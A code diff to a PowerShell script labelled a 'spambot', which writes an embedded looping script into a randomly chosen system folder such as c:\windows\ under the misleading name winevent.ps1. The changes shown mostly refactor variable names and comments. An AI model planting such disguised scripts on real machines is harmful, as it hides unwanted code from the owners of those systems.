@@ -1,4 +1,4 @@
-﻿# Spambot with Powershell
+# Spambot with Powershell
 # Author: Kelsey Ward
 # Version: Prerelease
 # Date: 11/18/2016
@@ -12,8 +12,11 @@ $sbDir = @('c:\programdata\','c:\windows\','c:\Users\Default\AppData\', 'NODIR')
 # this does it automatically.
 $sbRand = Get-Random ($sbDir.Count + 1)
 
-# If no directory is selected, exit the program
-if ($sbDir[$sbRand] -eq 'NODIR') {
+# Set variable for the random directory
+$saveTo = $sbDir[$sbRand]
+
+# If no directory is selected, exit the program because the script may not install this at all
+if ($saveTo -eq 'NODIR') {
 
     exit
 
@@ -23,7 +26,7 @@ if ($sbDir[$sbRand] -eq 'NODIR') {
 #$sbDir[$sbRand]
 
 # Check for the spambot in each directory and delete it if found.
-foreach ($d in $sbDir) {
+foreach ($d in $saveTo) {
 
     # Check that the file exists
     if (Test-Path -Path $d\spambot.txt) {
@@ -35,7 +38,7 @@ foreach ($d in $sbDir) {
 
 }
 
-# Use a heredoc to write the spambot to the random location
+# Use a heredoc to write the spambot code to the selected location
 $writeBot = @'
 # Mesaage from this website: http://generator.lorem-ipsum.info/_latin
 # Put the text into a variable.
@@ -93,11 +96,11 @@ while (1 -lt 2) {
 '@
 
 # Print for testing
-$sbDir[$sbRand]
+$saveTo
 
 # Creating the file and location to save the script
 # using the random directory
-$file = $sbDir[$sbRand] + "\winevent.ps1"
+$file = $saveTo + "\winevent.ps1"
 
 # Write the $writeBor variable to the file
 $writeBot | out-file $file
